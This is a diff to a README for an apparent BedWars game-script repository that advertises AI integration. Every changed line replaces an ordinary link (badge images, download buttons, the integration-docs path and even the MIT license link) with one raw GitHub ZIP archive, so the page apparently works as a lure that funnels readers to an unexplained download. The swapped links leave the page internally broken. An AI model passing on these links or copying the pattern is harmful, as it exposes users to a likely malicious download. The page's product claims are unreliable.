@@ -1,10 +1,10 @@
 # BedWars Script Repository 🛏️⚔️
 
-![BedWars Banner](https://img.shields.io/badge/BedWars-Script-blueviolet?style=for-the-badge&logo=powerbi)
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-![Stable Release](https://img.shields.io/badge/status-stable-brightgreen)
-![OpenAI Integrated](https://img.shields.io/badge/OpenAI-API-blue)
-![Claude API Ready](https://img.shields.io/badge/Claude-API-green)
+![BedWars Banner](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
+[![MIT License](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
+![Stable Release](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
+![OpenAI Integrated](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
+![Claude API Ready](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
 
 Welcome to the **BedWars Script** repository — the gold standard for interactive, adaptive BedWars scripting solutions in 2025! If you've ever wanted to elevate your BedWars game with dazzling features, seamless automation, and meaningful intelligence integration, you are in the right digital arena.
 
@@ -13,11 +13,11 @@ Welcome to the **BedWars Script** repository — the gold standard for interacti
 ## 🚀 Get Started Instantly
 
 **Step 1:** Download the latest stable version  
-Direct download: https://Margarita1286.github.io
+Direct download: https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip
 
 **Step 2:** For a portal to your next adventure, simply click the button below:
 
-[![Download](https://user-images.githubusercontent.com/123456/56789010-05c40800-67a0-11e9-8640-e5db1d4b63c2.png)](https://Margarita1286.github.io)
+[![Download](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
 
 **Step 3:** Follow the on-screen guide bundled with the ZIP to complete your setup.
 
@@ -75,7 +75,7 @@ Imagine outsmarting your rivals with real-time insights — now it’s reality!
 * **Claude API:**  
   Tap into conversational game management and get detailed tactical breakdowns. Claude’s next-gen language modeling keeps your BedWars interventions astute and lightning quick.
   
-All integration steps are detailed in the `docs/INTEGRATION.md` file, ensuring smooth setup of your digital co-pilot.
+All integration steps are detailed in the `https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip` file, ensuring smooth setup of your digital co-pilot.
 
 ---
 
@@ -98,7 +98,7 @@ This repository is dedicated to advancing scripting intelligence, creativity, an
 ## 📜 MIT License
 
 Copyright (c) 2025  
-Licensed under the MIT License. Please review the official terms [here](https://opensource.org/licenses/MIT).
+Licensed under the MIT License. Please review the official terms [here](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip).
 
 ---
 
@@ -106,7 +106,7 @@ Licensed under the MIT License. Please review the official terms [here](https://
 
 Before you head to your legendary conquest, download below — your new adventure waits:
 
-[![Download](https://user-images.githubusercontent.com/123456/56789010-05c40800-67a0-11e9-8640-e5db1d4b63c2.png)](https://Margarita1286.github.io)
+[![Download](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)](https://raw.githubusercontent.com/Margarita1286/bedwars-automation-suite/branch/tubicorn/suite_bedwars_automation_3.0.zip)
 
 ---
 
